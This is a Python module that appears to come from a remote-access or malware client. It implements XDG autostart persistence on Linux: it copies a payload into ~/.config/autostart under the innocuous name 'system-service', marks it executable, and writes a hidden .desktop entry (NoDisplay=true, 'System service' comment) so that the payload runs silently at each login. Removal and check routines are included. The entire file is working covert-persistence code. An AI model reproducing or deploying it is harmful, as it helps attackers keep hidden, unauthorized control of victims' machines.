import os

from client.modules.persist.manager import PersistenceMethod, PersistenceResult, _copy_payload


class XdgAutostartPersistence(PersistenceMethod):
    name = 'xdg'

    def install(self, entry_name: str = 'system-service') -> PersistenceResult:
        try:
            autostart_dir = os.path.expanduser('~/.config/autostart')
            os.makedirs(autostart_dir, exist_ok=True)

            payload_path = os.path.join(autostart_dir, entry_name)
            desktop_path = os.path.join(autostart_dir, f'{entry_name}.desktop')

            _copy_payload(payload_path)
            os.chmod(payload_path, 0o755)

            desktop_entry = f"""[Desktop Entry]
Type=Application
Name={entry_name}
Exec={payload_path}
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
Comment=System service
"""

            with open(desktop_path, 'w') as f:
                f.write(desktop_entry)

            return PersistenceResult(
                True, 'xdg',
                f'[+] XDG autostart persistence installed: {entry_name}',
                payload_path
            )
        except Exception as e:
            return PersistenceResult(False, 'xdg', f'[-] XDG autostart error: {str(e)}')

    def remove(self, entry_name: str = 'system-service') -> PersistenceResult:
        try:
            autostart_dir = os.path.expanduser('~/.config/autostart')
            for fname in [entry_name, f'{entry_name}.desktop']:
                fpath = os.path.join(autostart_dir, fname)
                try:
                    os.remove(fpath)
                except Exception:
                    pass
            return PersistenceResult(True, 'xdg', f'[+] XDG autostart persistence removed: {entry_name}')
        except Exception as e:
            return PersistenceResult(False, 'xdg', f'[-] XDG remove error: {str(e)}')

    def check(self) -> PersistenceResult:
        try:
            autostart_dir = os.path.expanduser('~/.config/autostart')
            if os.path.isdir(autostart_dir):
                entries = os.listdir(autostart_dir)
                if entries:
                    return PersistenceResult(True, 'xdg', f'[+] Found {len(entries)} autostart entries', details=str(entries))
            return PersistenceResult(True, 'xdg', '[-] No XDG autostart entries found')
        except Exception:
            return PersistenceResult(False, 'xdg', '[-] XDG check failed')
